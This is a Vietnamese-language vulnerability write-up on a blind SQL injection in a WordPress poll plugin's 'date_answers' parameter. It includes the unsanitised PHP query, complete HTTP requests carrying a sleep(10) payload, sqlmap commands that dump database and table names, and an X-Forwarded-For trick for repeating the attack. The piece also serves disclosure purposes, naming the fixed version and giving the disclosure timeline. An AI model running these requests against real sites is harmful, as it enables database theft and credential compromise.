---
title: WordPress Plugin Poll, Survey, Questionnaire and Voting system 1.5.2 - 'date_answers' Blind SQL Injection
date: 5/07/2021
layout: single
header:
  teaser: /assets/images/wordpress.png
--- 

## Mô tả
Tác giả khai thác: inspired - Toby Jackson

Một lỗ hổng đã được phát hiện trong plugin wpdevart wordpress "Poll, Survey, Questionnaire and Voting system" phiên bản 1.5.0 và 1.5.2. Có thể thực hiện chèn SQL mù vào tham số date_answers [] khi bỏ phiếu. Điều này có thể được sử dụng để kết xuất cơ sở dữ liệu back end. Phiên bản 1.5.2 yêu cầu thay đổi tiêu đề bằng phương pháp thích hợp để giả mạo địa chỉ IP, chẳng hạn như X-Forwarded-For

Nguồn khai thác [exploits/50052](https://www.exploit-db.com/exploits/50052)
## Vulnerable Code 

Mã dễ bị tấn công nằm trong trang front_end.php trong hàm save_poll_in_databese (). Nó lấy $ question_id và $ current_user_ip trước khi lưu trữ phiếu bầu trong một biến có tên là $ new_voted_array, như được thấy bên dưới, từ tham số bài đăng date_answers

```php
$new_voted_array=$_POST['date_answers'];

```
Sau đó, mảng được lặp lại và biến $ new_answer được sử dụng như một phần của truy vấn where mà không bị khử trùng.

```php
if($new_voted_array)
  foreach($new_voted_array as $new_answer)  {
    $wpdb->query('UPDATE '.$wpdb->prefix.'polls SET vote = vote+1 WHERE `question_id` = '.$question_id.' AND `answer_name` = '.$new_answer.'');

```

## Demo 
```shell
------
POST /blog/wp-admin/admin-ajax.php?action=pollinsertvalues HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 67
Origin: http://localhost
DNT: 1
Connection: close
Referer: http://localhost/blog/index.php/2021/06/09/research/
Cookie: wordpress_d23cdc2cc5dd18709e8feb86452d865b=inspired%7C1623345285%7C52E5QESQG5PIPUT2tixVHPIkdN8inwgNojy9hs0JvDS%7C3538f3f44a02304781e099f970dc762fd89e88378a46613cf636fcd28a9755d3; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_d23cdc2cc5dd18709e8feb86452d865b=inspired%7C1623345285%7C52E5QESQG5PIPUT2tixVHPIkdN8inwgNojy9hs0JvDS%7C3d7d7b6485e1daa04da753dcc4e85a56150091301de3668ffe108e7829134f0d; wp-settings-time-1=1623238438

question_id=1&poll_answer_securety=5b29ac18fe&date_answers%5B0%5D=sleep(10)
------

```
Bằng cách sử dụng điều này, cơ sở dữ liệu có thể dễ dàng được kết xuất bằng cách nắm bắt yêu cầu, với một bộ đánh chặn như burpsuite và sử dụng sqlmap. Bằng cách đặt dấu * tại điểm tiêm cần thiết, sqlmap sẽ kiểm tra vị trí này trước tiên.


```shell 
------
POST /blog/wp-admin/admin-ajax.php?action=pollinsertvalues HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 67
Origin: http://localhost
DNT: 1
Connection: close
Referer: http://localhost/blog/index.php/2021/06/09/research/
Cookie: wordpress_d23cdc2cc5dd18709e8feb86452d865b=inspired%7C1623345285%7C52E5QESQG5PIPUT2tixVHPIkdN8inwgNojy9hs0JvDS%7C3538f3f44a02304781e099f970dc762fd89e88378a46613cf636fcd28a9755d3; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_d23cdc2cc5dd18709e8feb86452d865b=inspired%7C1623345285%7C52E5QESQG5PIPUT2tixVHPIkdN8inwgNojy9hs0JvDS%7C3d7d7b6485e1daa04da753dcc4e85a56150091301de3668ffe108e7829134f0d; wp-settings-time-1=1623238438

question_id=1&poll_answer_securety=5b29ac18fe&date_answers%5B0%5D=*
------

```
Lưu tập tin này dưới dạng  request.txt và chạy công cụ.

```shell
------
python sqlmap.py -r request.txt --dbms=mysql --dbs --level=5 --risk=3

[14:30:54] [INFO] testing MySQL
[14:30:54] [INFO] confirming MySQL
[14:30:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.46
back-end DBMS: MySQL >= 8.0.0
[14:30:54] [INFO] fetching database names
[14:30:54] [INFO] fetching number of databases
[14:30:54] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[14:30:54] [INFO] retrieved: 2
[14:30:54] [INFO] resumed: information_schema
[14:30:54] [INFO] resumed: wordpress
available databases [2]:
[*] information_schema
[*] wordpress
------
```
```shell
------
python sqlmap -r request.txt --dbms=mysql -D wordpress --tables --level=5 --risk=3

Database: wordpress
[19 tables]
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_democracy_a        |
| wp_democracy_log      |
| wp_democracy_q        |
| wp_links              |
| wp_options            |
| wp_polls              |
| wp_polls_question     |
| wp_polls_templates    |
| wp_polls_users        |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
------
```
Trong các phiên bản 1.5.1 và 1.5.2, lỗ hổng này chỉ xảy ra trong lần bỏ phiếu đầu tiên mà người dùng bỏ qua. Thêm tiêu đề X-Forwarded-For ngẫu nhiên vào các yêu cầu sẽ cho phép lặp lại cuộc tấn công như mô tả ở trên.

Điều này đã được chứng minh trong PoC sau

+ [https://youtu.be/Fj1zeXNxDYQ](https://www.youtube.com/watch?v=Fj1zeXNxDYQ
)
+ [https://youtu.be/P1r7gk0DSaM](https://www.youtube.com/watch?v=Fj1zeXNxDYQ
)

Kẻ tấn công có thể kết xuất cơ sở dữ liệu back-end của máy chủ và giành quyền truy cập vào thông tin đăng nhập của người dùng mà sau đó có thể được sử dụng để thực hiện các hành vi độc hại khác. Nếu được định cấu hình không chính xác, nó cũng có thể dẫn đến việc kẻ tấn công có thể thực thi mã từ xa trên máy chủ

## Nền tảng bị ảnh hưởng 
Các trang web WordPress chạy plugin "Poll, Survey, Questionnaire and Voting system" phiên bản 1.5.2 (các phiên bản cũ hơn cũng có thể bị ảnh hưởng).

## Cách khắc phục
Bản cập nhật đã được sửa trong phiên bản 1.5.3, vì vậy bạn nên cập nhật lên phiên bản này nếu sử dụng plugin.

## Thời gian công bố 

+ 9/6/2021: Lỗ hổng bảo mật được xác định.
+ 9/6/2021: Nhà phát triển đã thông báo về lỗ hổng bảo mật.
+ 9/6/2021: Nhà cung cấp trả lời để thảo luận chi tiết hơn về lỗ hổng bảo mật.
+ 9/6/2021: Đã gửi bằng chứng khái niệm cho nhà cung cấp và các khối mã bị ảnh hưởng.
+ 10/6/2021: Email của nhà cung cấp để thông báo lỗ hổng bảo mật đã được khắc phục.
+ 10/6/2021: Bản sửa lỗi ban đầu được xác nhận, nhà cung cấp vui lòng tiết lộ lỗ hổng bảo mật.
+ 10/6/2021: CVE được yêu cầu.
+ 19/6/2021: Liên hệ với WPScan để thảo luận về lỗ hổng bảo mật.
+ 19/6/2021: Bản sửa lỗi đã xác nhận không hợp lệ khi người dùng mới bỏ phiếu hoặc chỉnh sửa tiêu đề.
+ 10/6/2021: Đã liên hệ với nhà cung cấp để yêu cầu sửa chữa thêm.
+ 22/6/2021: Nhà cung cấp xác nhận bản sửa lỗi. Thông tin được công khai.
